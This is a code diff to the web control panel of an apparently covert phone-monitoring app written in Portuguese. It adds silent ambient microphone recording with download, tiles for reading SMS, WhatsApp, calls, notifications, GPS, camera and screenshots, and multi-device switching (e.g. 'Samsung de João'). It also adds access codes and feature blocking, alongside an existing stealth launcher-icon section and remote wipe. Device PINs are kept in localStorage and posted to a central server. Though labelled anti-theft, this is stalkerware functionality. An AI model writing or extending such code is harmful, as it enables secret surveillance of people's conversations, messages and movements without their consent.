@@ -379,6 +379,60 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
   </div>
   <!-- SIM cards -->
   <div class="grid g2" style="margin-bottom:16px" id="simWrap"></div>
+  <!-- Category tiles -->
+  <style>
+    .cat-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;margin-bottom:16px}
+    @media(max-width:800px){.cat-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
+    @media(max-width:420px){.cat-grid{grid-template-columns:repeat(1,minmax(0,1fr))}}
+    .cat-tile{display:flex;align-items:center;gap:12px;padding:14px 16px;border-radius:var(--r);background:var(--card);border:1px solid var(--line);cursor:pointer;transition:.14s;text-decoration:none;color:inherit}
+    .cat-tile:hover{border-color:var(--line2);transform:translateY(-1px)}.cat-tile:active{transform:scale(.97)}
+    .cat-ico{width:42px;height:42px;border-radius:12px;display:grid;place-items:center;font-size:20px;flex:none;background:var(--card2);border:1px solid var(--line)}
+    .cat-info{flex:1;min-width:0}.cat-info b{display:block;font-size:13px;font-weight:800}.cat-info span{color:var(--mu);font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:block}
+    .cat-arr{color:var(--mu2);font-size:16px;flex:none}
+    /* Multi-device bar */
+    .dev-bar{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:var(--r);background:var(--card2);border:1px solid var(--line);margin-bottom:12px;position:relative}
+    .dev-bar select{flex:1;border:none;background:transparent;font-size:13px;font-weight:700;color:var(--tx);cursor:pointer;outline:none}
+    .dev-bar .dev-add{padding:5px 12px;border-radius:8px;font-size:12px;font-weight:700;border:1px solid var(--line);background:var(--card);cursor:pointer;white-space:nowrap}
+  </style>
+  <!-- Multi-device selector -->
+  <div class="dev-bar" id="devBar">
+    <span style="font-size:16px">📱</span>
+    <select id="devSelect" onchange="devTrocar()"><option value="">Este dispositivo</option></select>
+    <button class="dev-add" onclick="devAdicionar()">➕ Dispositivo</button>
+  </div>
+  <!-- Category grid -->
+  <div class="cat-grid">
+    <div class="cat-tile" onclick="ir('sms')">
+      <div class="cat-ico" style="background:color-mix(in srgb,var(--ac) 12%,var(--card2))">📱</div>
+      <div class="cat-info"><b>Comunicação</b><span>SMS · WhatsApp · Chamadas</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+    <div class="cat-tile" onclick="ir('adv');tabAdv('at-loc')">
+      <div class="cat-ico" style="background:color-mix(in srgb,#4caf50 12%,var(--card2))">📍</div>
+      <div class="cat-info"><b>Localização</b><span id="catLocSub">GPS · Geofences</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+    <div class="cat-tile" onclick="ir('adv');tabAdv('at-audio')">
+      <div class="cat-ico" style="background:color-mix(in srgb,#ff9800 12%,var(--card2))">🎙️</div>
+      <div class="cat-info"><b>Áudio Ambiente</b><span id="catAudioSub">Gravar microfone</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+    <div class="cat-tile" onclick="ir('adv');tabAdv('at-cam')">
+      <div class="cat-ico" style="background:color-mix(in srgb,#9c27b0 12%,var(--card2))">📸</div>
+      <div class="cat-info"><b>Câmara & Ecrã</b><span>Foto · Screenshot</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+    <div class="cat-tile" onclick="ir('notifs')">
+      <div class="cat-ico" style="background:color-mix(in srgb,#2196f3 12%,var(--card2))">🔔</div>
+      <div class="cat-info"><b>Notificações</b><span id="catNotifSub">Apps instaladas</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+    <div class="cat-tile" onclick="ir('adv');tabAdv('at-antiroubo')">
+      <div class="cat-ico" style="background:color-mix(in srgb,#e94560 12%,var(--card2))">🛡️</div>
+      <div class="cat-info"><b>Anti-Roubo</b><span id="catAtSub">Proteção ativa</span></div>
+      <div class="cat-arr">›</div>
+    </div>
+  </div>
   <!-- Lower section -->
   <div class="pnl-lower">
     <div class="card"><h3><svg class="i" data-i="bolt"></svg>Ações rápidas</h3>
@@ -971,6 +1025,8 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
       <button class="adv-tab" data-at="at-logs">📋 Registos</button>
       <button class="adv-tab" data-at="at-seg">🔐 Segurança</button>
       <button class="adv-tab" data-at="at-antiroubo" id="tabAntiRoubo">🚨 Anti-Roubo</button>
+      <button class="adv-tab" data-at="at-audio">🎙️ Ambiente</button>
+      <button class="adv-tab" data-at="at-acesso">🔑 Acesso</button>
     </div>
     <!-- Controlo total -->
     <div class="adv-sec on" id="at-ctrl">
@@ -1253,6 +1309,109 @@ button.it:hover,.it.ck:hover{border-color:var(--line2);cursor:pointer}
         </div>
       </div>
     </div>
+
+    <!-- ═══ ÁUDIO AMBIENTE ══════════════════════════════════════════════════ -->
+    <div class="adv-sec" id="at-audio">
+      <style>
+        .amb-hero{display:flex;flex-direction:column;align-items:center;gap:16px;padding:28px 20px;border-radius:var(--r);border:2px solid var(--line);background:var(--card);margin-bottom:16px;text-align:center}
+        .amb-hero.gravando{border-color:#e94560;background:color-mix(in srgb,#e94560 6%,var(--card))}
+        .amb-btn-big{width:80px;height:80px;border-radius:50%;border:none;cursor:pointer;font-size:32px;display:grid;place-items:center;transition:.15s;background:var(--card2);border:2px solid var(--line)}
+        .amb-btn-big:hover{transform:scale(1.06)}.amb-btn-big.gravando{background:#e94560;border-color:#e94560;animation:pulse 1.2s infinite}
+        .amb-wave{display:flex;align-items:flex-end;gap:3px;height:30px;justify-content:center}
+        .amb-wave span{width:4px;border-radius:2px;background:var(--ac);animation:wave .8s ease-in-out infinite}
+        .amb-wave span:nth-child(1){animation-delay:0s;height:8px}.amb-wave span:nth-child(2){animation-delay:.12s;height:18px}.amb-wave span:nth-child(3){animation-delay:.24s;height:28px}.amb-wave span:nth-child(4){animation-delay:.36s;height:18px}.amb-wave span:nth-child(5){animation-delay:.48s;height:8px}
+        @keyframes wave{0%,100%{transform:scaleY(.4)}50%{transform:scaleY(1)}}
+        .amb-dl{display:inline-flex;align-items:center;gap:8px;padding:10px 20px;border-radius:10px;background:var(--ok);color:#fff;font-weight:700;font-size:13px;cursor:pointer;border:none;text-decoration:none;margin-top:8px}
+      </style>
+      <div class="amb-hero" id="ambHero">
+        <button class="amb-btn-big" id="ambBtn" onclick="ambToggle()">🎙️</button>
+        <div id="ambWave" style="display:none" class="amb-wave"><span></span><span></span><span></span><span></span><span></span></div>
+        <div>
+          <b id="ambStatus" style="font-size:15px">Pronto para gravar</b>
+          <div class="tiny muted" id="ambSub" style="margin-top:4px">Capta o microfone silenciosamente</div>
+        </div>
+        <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;justify-content:center">
+          <label class="tiny muted">Duração:</label>
+          <select id="ambSeg" style="padding:6px 10px;border-radius:8px;border:1px solid var(--line);background:var(--card2);font-size:13px">
+            <option value="15">15 s</option><option value="30" selected>30 s</option><option value="60">1 min</option>
+            <option value="120">2 min</option><option value="300">5 min</option>
+          </select>
+        </div>
+        <div id="ambDownload" style="display:none">
+          <a id="ambDlLink" class="amb-dl" href="#" download="ambiente.aac">⬇️ Descarregar gravação</a>
+        </div>
+      </div>
+      <div class="card" id="ambTimer" style="display:none;text-align:center;padding:16px">
+        <div class="tiny muted">A gravar...</div>
+        <div style="font-size:28px;font-weight:800;letter-spacing:-.5px;margin:8px 0" id="ambCountdown">—</div>
+        <button class="btn er sm" onclick="ambParar()">⏹ Parar agora</button>
+      </div>
+    </div>
+
+    <!-- ═══ GESTÃO DE ACESSO ════════════════════════════════════════════════ -->
+    <div class="adv-sec" id="at-acesso">
+      <style>
+        .code-box{display:flex;align-items:center;gap:10px;padding:12px 16px;border-radius:10px;background:var(--card2);border:1px solid var(--line);margin-bottom:10px}
+        .code-box .cv{font-family:monospace;font-size:20px;font-weight:800;letter-spacing:2px;flex:1}
+        .code-eye{background:none;border:none;cursor:pointer;font-size:16px;padding:4px}
+        .feat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
+        .feat-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:10px;border:1px solid var(--line);background:var(--card2);cursor:pointer;transition:.13s}
+        .feat-item:hover{border-color:var(--line2)}.feat-item.bloq{opacity:.55;background:color-mix(in srgb,var(--er) 8%,var(--card2))}
+        .feat-item .fi{font-size:18px}.feat-item .ft{flex:1;font-size:12px;font-weight:700}
+        .feat-item .fb{font-size:11px;color:var(--mu)}
+        .prazo-seg{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+        .prazo-seg button{padding:6px 14px;border-radius:8px;border:1px solid var(--line);background:var(--card2);font-size:12px;font-weight:700;cursor:pointer}
+        .prazo-seg button.on{background:var(--ac);color:#06121f;border-color:var(--ac)}
+      </style>
+      <div class="grid g2" style="align-items:start;gap:16px">
+        <!-- Codes -->
+        <div class="card">
+          <h3>🔑 Códigos de Acesso</h3>
+          <p class="tiny muted" style="margin:0 0 12px">Código principal (modo normal) e código avançado. Renova para revogar acesso imediato a qualquer sessão ativa.</p>
+          <div style="margin-bottom:6px"><small class="muted">Código principal</small></div>
+          <div class="code-box">
+            <span class="cv" id="acCode">••••</span>
+            <button class="code-eye" onclick="acToggleVer('acCode')">👁</button>
+            <button class="btn sm" onclick="acCopiar('acCode')">Copiar</button>
+          </div>
+          <div style="margin-bottom:6px;margin-top:10px"><small class="muted">Código avançado</small></div>
+          <div class="code-box">
+            <span class="cv" id="acCode2">••••••</span>
+            <button class="code-eye" onclick="acToggleVer('acCode2')">👁</button>
+            <button class="btn sm" onclick="acCopiar('acCode2')">Copiar</button>
+          </div>
+          <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
+            <button class="btn er" onclick="acRenovar()">🔄 Renovar códigos</button>
+          </div>
+          <p class="tiny muted" style="margin-top:8px;margin-bottom:0">Ao renovar, os códigos anteriores param de funcionar imediatamente. As permissões no telefone ficam.</p>
+        </div>
+        <!-- Expiry -->
+        <div class="card">
+          <h3>⏳ Prazo de Acesso</h3>
+          <p class="tiny muted" style="margin:0 0 12px">Define quanto tempo o acesso está disponível. Após o prazo, o código deixa de funcionar até ser renovado.</p>
+          <div id="acPrazoInfo" style="padding:10px 14px;border-radius:10px;background:var(--card2);border:1px solid var(--line);margin-bottom:12px;font-size:13px">
+            A carregar...
+          </div>
+          <div class="prazo-seg" id="prazoSeg">
+            <button onclick="acPrazoDefinir(1)">1 hora</button>
+            <button onclick="acPrazoDefinir(6)">6 horas</button>
+            <button onclick="acPrazoDefinir(24)">1 dia</button>
+            <button onclick="acPrazoDefinir(72)">3 dias</button>
+            <button onclick="acPrazoDefinir(168)">1 semana</button>
+          </div>
+          <button class="btn" onclick="acPrazoRevogar()">♾ Sem prazo (permanente)</button>
+        </div>
+      </div>
+      <!-- Feature blocking -->
+      <div class="card" style="margin-top:16px">
+        <h3>🚫 Bloquear Funcionalidades</h3>
+        <p class="tiny muted" style="margin:0 0 14px">Clica numa funcionalidade para bloquear/desbloquear. Quando bloqueada, o endpoint retorna erro mesmo com código válido.</p>
+        <div class="feat-grid" id="featGrid">
+          <div class="tiny muted">A carregar...</div>
+        </div>
+      </div>
+    </div>
+
   </div>
 </section>
 
@@ -2320,7 +2479,304 @@ $('#atWipeConfirm').onclick=async()=>{
 document.addEventListener('click',e=>{
   const t=e.target.closest('[data-at="at-antiroubo"]');
   if(t){ atCarregar(); iconeCarregar(); }
+  const a=e.target.closest('[data-at="at-audio"]');
+  if(a) ambCarregar();
+  const ac=e.target.closest('[data-at="at-acesso"]');
+  if(ac) acCarregar();
 });
+
+// ══════════════════════════════════════════════════════════════════════════
+// ÁUDIO AMBIENTE
+// ══════════════════════════════════════════════════════════════════════════
+let ambTimer=null;
+async function ambCarregar(){
+  try{
+    const r=await advPost('/ambiente-estado',{});
+    const s=r.estado||r;
+    ambPintar(s);
+  }catch(_){}
+}
+function ambPintar(s){
+  const btn=$('#ambBtn'),hero=$('#ambHero'),wave=$('#ambWave'),status=$('#ambStatus'),sub=$('#ambSub'),timer=$('#ambTimer'),dl=$('#ambDownload');
+  if(!btn)return;
+  if(s.gravando){
+    btn.textContent='⏹';btn.classList.add('gravando');
+    hero.classList.add('gravando');wave.style.display='flex';
+    status.textContent='A gravar...';
+    sub.textContent='Dura '+s.duracao_pedida+'s — iniciado '+horaWa(s.iniciado_em);
+    timer.style.display='block';dl.style.display='none';
+    ambContagem(s.iniciado_em,s.duracao_pedida);
+  } else {
+    btn.textContent='🎙️';btn.classList.remove('gravando');
+    hero.classList.remove('gravando');wave.style.display='none';
+    clearInterval(ambTimer);ambTimer=null;
+    timer.style.display='none';
+    if(s.tem_audio){
+      status.textContent='Gravação pronta ('+Math.round(s.tamanho/1024)+' KB)';
+      sub.textContent='Clica para descarregar';
+      dl.style.display='block';
+      $('#ambDlLink').href=HOST+'/audio?k='+KEY+'&a2='+KEY2;
+    } else {
+      status.textContent='Pronto para gravar';
+      sub.textContent='Capta o microfone silenciosamente';
+      dl.style.display='none';
+    }
+  }
+}
+function ambContagem(ini,dur){
+  clearInterval(ambTimer);
+  const cd=$('#ambCountdown');if(!cd)return;
+  ambTimer=setInterval(()=>{
+    const resto=Math.max(0,dur-(Date.now()-ini)/1000);
+    cd.textContent=Math.ceil(resto)+'s';
+    if(resto<=0){clearInterval(ambTimer);ambTimer=null;setTimeout(ambCarregar,1500);}
+  },500);
+}
+async function ambToggle(){
+  const s=await advPost('/ambiente-estado',{});
+  if((s.estado||s).gravando){await ambParar();}else{await ambGravar();}
+}
+async function ambGravar(){
+  const seg=parseInt($('#ambSeg').value)||30;
+  const r=await advPost('/ambiente',{segundos:seg});
+  if(r&&r.ok){toast('🎙️ A gravar '+seg+'s...');ambCarregar();}
+  else toast((r&&r.erro)||'Erro ao iniciar gravação');
+}
+async function ambParar(){
+  await advPost('/ambiente-parar',{});toast('⏹ Gravação parada');setTimeout(ambCarregar,800);
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// MULTI-DISPOSITIVO
+// ══════════════════════════════════════════════════════════════════════════
+let DEV_ATUAL=null;
+function devGuardar(){
+  try{localStorage.setItem('ftx_devs',JSON.stringify(devLista()));}catch(_){}
+}
+function devLista(){
+  try{return JSON.parse(localStorage.getItem('ftx_devs')||'[]');}catch(_){return [];}
+}
+function devRender(){
+  const sel=$('#devSelect');if(!sel)return;
+  const devs=devLista();
+  while(sel.options.length>1)sel.remove(1);
+  devs.forEach((d,i)=>sel.add(new Option('📱 '+d.nome,String(i))));
+}
+function devAdicionar(){
+  const nome=prompt('Nome do dispositivo (ex: Samsung de João):');if(!nome)return;
+  const relayId=prompt('ID Relay (9 dígitos — ver em Definições › Ligação no telefone):');if(!relayId)return;
+  const pin=prompt('Código de acesso:');if(!pin)return;
+  const pin2=prompt('Código avançado (pode deixar vazio):');
+  const devs=devLista();
+  devs.push({nome,relayId,pin,pin2:pin2||'',adicionado:Date.now()});
+  try{localStorage.setItem('ftx_devs',JSON.stringify(devs));}catch(_){}
+  devRender();
+  toast('✅ Dispositivo adicionado: '+nome);
+}
+function devTrocar(){
+  const sel=$('#devSelect');if(!sel)return;
+  const idx=parseInt(sel.value);
+  if(isNaN(idx)){DEV_ATUAL=null;return;}
+  const d=devLista()[idx];if(!d)return;
+  DEV_ATUAL=d;
+  toast('📱 A ligar a '+d.nome+'...');
+}
+devRender();
+
+// ══════════════════════════════════════════════════════════════════════════
+// GESTÃO DE ACESSO — Códigos, Prazo, Funcionalidades
+// ══════════════════════════════════════════════════════════════════════════
+let AC={code:'',code2:'',prazo:0,bloqueadas:[]};
+let acVerCode=false,acVerCode2=false;
+
+async function acCarregar(){
+  try{
+    const r=await advPost('/codigos',{});
+    AC.code=r.code||'';AC.code2=r.code2||'';
+    AC.prazo=r.prazo||0;
+    AC.bloqueadas=r.bloqueadas||[];
+    acPintar();
+    acPrazoInfo();
+    acFeatGrid();
+  }catch(_){}
+}
+function acPintar(){
+  const c=$('#acCode'),c2=$('#acCode2');
+  if(c) c.textContent=acVerCode?AC.code:'•'.repeat(AC.code.length||4);
+  if(c2) c2.textContent=acVerCode2?AC.code2:'•'.repeat(AC.code2.length||6);
+}
+function acToggleVer(id){
+  if(id==='acCode'){acVerCode=!acVerCode;}else{acVerCode2=!acVerCode2;}
+  acPintar();
+}
+function acCopiar(id){
+  const v=id==='acCode'?AC.code:AC.code2;
+  navigator.clipboard.writeText(v).then(()=>toast('📋 Copiado!')).catch(()=>{});
+}
+async function acRenovar(){
+  if(!confirm('Renovar os códigos? Os códigos actuais deixam de funcionar imediatamente.'))return;
+  const r=await advPost('/codigos-renovar',{});
+  if(r&&r.ok){
+    AC.code=r.code;AC.code2=r.code2;
+    acVerCode=true;acVerCode2=true;
+    acPintar();
+    toast('🔄 Códigos renovados!');
+  }
+}
+function acPrazoInfo(){
+  const el=$('#acPrazoInfo');if(!el)return;
+  if(!AC.prazo||AC.prazo===0){
+    el.innerHTML='<span style="color:var(--ok)">♾ Sem prazo — acesso permanente</span>';
+  } else {
+    const resto=AC.prazo-Date.now();
+    if(resto<=0){
+      el.innerHTML='<span style="color:var(--er)">⛔ Expirado — acesso bloqueado</span>';
+    } else {
+      const h=Math.floor(resto/3600000),m=Math.floor((resto%3600000)/60000);
+      el.innerHTML='<span style="color:var(--ok)">✅ Expira em <b>'+h+'h '+m+'m</b></span> — '+new Date(AC.prazo).toLocaleString();
+    }
+  }
+}
+async function acPrazoDefinir(horas){
+  const r=await advPost('/prazo-definir',{horas});
+  if(r&&r.ok){AC.prazo=r.prazo;acPrazoInfo();toast('⏳ Prazo definido: '+horas+'h');}
+}
+async function acPrazoRevogar(){
+  const r=await advPost('/prazo-revogar',{});
+  if(r&&r.ok){AC.prazo=0;acPrazoInfo();toast('♾ Acesso permanente');}
+}
+const FEATS=[
+  {id:'sms',ico:'💬',nome:'SMS / Chamadas'},
+  {id:'wa',ico:'🟢',nome:'WhatsApp'},
+  {id:'screenshot',ico:'📸',nome:'Screenshot'},
+  {id:'foto',ico:'📷',nome:'Câmara'},
+  {id:'local',ico:'📍',nome:'Localização'},
+  {id:'ambiente',ico:'🎙️',nome:'Áudio Ambiente'},
+  {id:'at-bloquear',ico:'🔒',nome:'Bloquear Ecrã'},
+  {id:'at-wipe',ico:'💥',nome:'Apagar Dados'},
+];
+function acFeatGrid(){
+  const g=$('#featGrid');if(!g)return;
+  g.innerHTML=FEATS.map(f=>{
+    const bl=AC.bloqueadas.includes(f.id);
+    return`<div class="feat-item${bl?' bloq':''}" onclick="acToggleFeat('${f.id}')">
+      <span class="fi">${f.ico}</span>
+      <div style="flex:1"><div class="ft">${f.nome}</div><div class="fb">${bl?'🚫 Bloqueada':'✅ Ativa'}</div></div>
+    </div>`;
+  }).join('');
+}
+async function acToggleFeat(id){
+  const bl=AC.bloqueadas.includes(id);
+  const ep=bl?'/funcao-desbloquear':'/funcao-bloquear';
+  const r=await advPost(ep,{funcao:id});
+  if(r&&r.ok){
+    if(bl)AC.bloqueadas=AC.bloqueadas.filter(x=>x!==id);
+    else AC.bloqueadas.push(id);
+    acFeatGrid();toast(bl?'✅ Desbloqueada':'🚫 Bloqueada: '+id);
+  }
+}
+// Update dashboard category subtitles when state loads
+function atualizarCatTiles(){
+  const ls=$('#catLocSub');if(ls)ls.textContent=ESTADO_LOCAL?'GPS ativo':'GPS · Geofences';
+  const at=$('#catAtSub');if(at)at.textContent=AT&&AT.ativo?'🔴 Proteção ativa':'Desativado';
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// CONTA CENTRAL — multi-dispositivo via studio.fusaotech.com/conta.php
+// ══════════════════════════════════════════════════════════════════════════
+const CONTA_URL='https://studio.fusaotech.com/conta.php';
+let CONTA={user:'',token:'',dispositivos:[]};
+
+function contaCarregar(){
+  try{
+    const s=localStorage.getItem('ftx_conta');
+    if(s){CONTA=JSON.parse(s);return true;}
+  }catch(_){}
+  return false;
+}
+function contaSalvar(){try{localStorage.setItem('ftx_conta',JSON.stringify(CONTA));}catch(_){}}
+
+async function contaApi(acao,extra){
+  const r=await fetch(CONTA_URL,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({acao,...extra})});
+  return r.json();
+}
+
+function contaDevRender(){
+  const sel=$('#devSelect');if(!sel)return;
+  const devs=CONTA.dispositivos||[];
+  while(sel.options.length>1)sel.remove(1);
+  devs.forEach((d,i)=>sel.add(new Option('📱 '+d.nome,String(i))));
+  const bar=$('#devBar');
+  if(bar){
+    const lbl=CONTA.user?`<span class="tiny muted" style="margin-left:4px">@${CONTA.user}</span>`:'';
+    let el=bar.querySelector('.conta-label');
+    if(!el){el=document.createElement('span');el.className='conta-label';el.style='font-size:11px;color:var(--mu)';bar.insertBefore(el,bar.firstChild);}
+    el.textContent=CONTA.user?'@'+CONTA.user:'';
+  }
+}
+
+async function contaEntrarOuRegistar(){
+  if(CONTA.user&&CONTA.token){
+    // Already logged in, re-sync
+    const r=await contaApi('listar',{user:CONTA.user,token:CONTA.token});
+    if(r.ok){CONTA.dispositivos=r.dispositivos;contaSalvar();contaDevRender();toast('✅ '+CONTA.dispositivos.length+' dispositivos carregados');}
+    else{CONTA={user:'',token:'',dispositivos:[]};contaSalvar();contaEntrarOuRegistar();}
+    return;
+  }
+  const modo=confirm('Tens conta FusaoTechX?\n\nOK = Entrar   Cancelar = Criar nova');
+  if(modo){
+    const user=prompt('Nome de utilizador:');if(!user)return;
+    const token=prompt('Token da conta (24 caracteres):');if(!token)return;
+    const r=await contaApi('entrar',{user,token});
+    if(r.ok){CONTA={user,token,dispositivos:r.dispositivos};contaSalvar();contaDevRender();toast('✅ Olá '+user+'! '+r.dispositivos.length+' dispositivos');}
+    else alert('❌ Dados inválidos. Verifica o nome e token.');
+  } else {
+    const user=prompt('Escolhe um nome de utilizador (mínimo 3 letras):');if(!user)return;
+    const r=await contaApi('registar',{user});
+    if(r.ok){
+      CONTA={user:r.user,token:r.token,dispositivos:[]};contaSalvar();
+      alert('✅ Conta criada!\n\nGuarda este token — só aparece uma vez:\n\n'+r.token+'\n\nNome: '+r.user);
+      contaDevRender();toast('🎉 Conta criada: @'+r.user);
+    } else alert('❌ '+(r.erro==='ja_existe'?'Nome já existe, escolhe outro.':'Erro: '+r.erro));
+  }
+}
+
+async function contaAdicionarDev(){
+  if(!CONTA.user){await contaEntrarOuRegistar();if(!CONTA.user)return;}
+  const nome=prompt('Nome do dispositivo (ex: Samsung de João):');if(!nome)return;
+  const relayId=prompt('ID Relay (ver em Definições › Ligação no telefone):');if(!relayId)return;
+  const pin=prompt('Código de acesso (PIN):');if(!pin)return;
+  const pin2=prompt('Código avançado (pode deixar vazio):');
+  const r=await contaApi('adicionar',{user:CONTA.user,token:CONTA.token,nome,relayId,pin:pin||'',pin2:pin2||''});
+  if(r.ok){
+    CONTA.dispositivos.push({nome,relayId,pin,pin2:pin2||'',ts:Date.now()});
+    contaSalvar();contaDevRender();toast('✅ Dispositivo adicionado: '+nome);
+  } else alert('❌ Erro: '+r.erro);
+}
+
+async function contaRemoverDev(idx){
+  if(!confirm('Remover este dispositivo da conta?'))return;
+  const r=await contaApi('remover',{user:CONTA.user,token:CONTA.token,idx});
+  if(r.ok){CONTA.dispositivos.splice(idx,1);contaSalvar();contaDevRender();toast('🗑️ Dispositivo removido');}
+}
+
+function devTrocar(){
+  const sel=$('#devSelect');if(!sel)return;
+  const idx=parseInt(sel.value);
+  if(isNaN(idx)){DEV_ATUAL=null;return;}
+  const d=CONTA.dispositivos[idx]||devLista()[idx];if(!d)return;
+  DEV_ATUAL=d;
+  toast('📱 A ligar a '+d.nome+'...');
+  // TODO: apply relay connection with d.relayId / d.pin
+}
+
+// Replace devAdicionar to use account system
+function devAdicionar(){contaAdicionarDev();}
+
+// Init
+contaCarregar();
+contaDevRender();
 
 // ── Stealth: ícone launcher ───────────────────────────────────────────────
 async function iconeCarregar(){
@@ -2371,6 +2827,8 @@ function ir(v){
     atualizarContadores();
     atualizarAtividade();
     atualizarSocCt();
+    atualizarCatTiles();
+    contaDevRender();
     // Connection status
     const dot=document.getElementById('connDot'),txt=document.getElementById('connTxt'),s2=document.getElementById('sessao2');
     if(dot&&txt){const on=!!S.controlo||!!S.notif;dot.className='dot'+(on?' on':'');txt.textContent=S.ecra?'Ligado (ecrã ao vivo)':on?'Ligado':'A ligar…'}
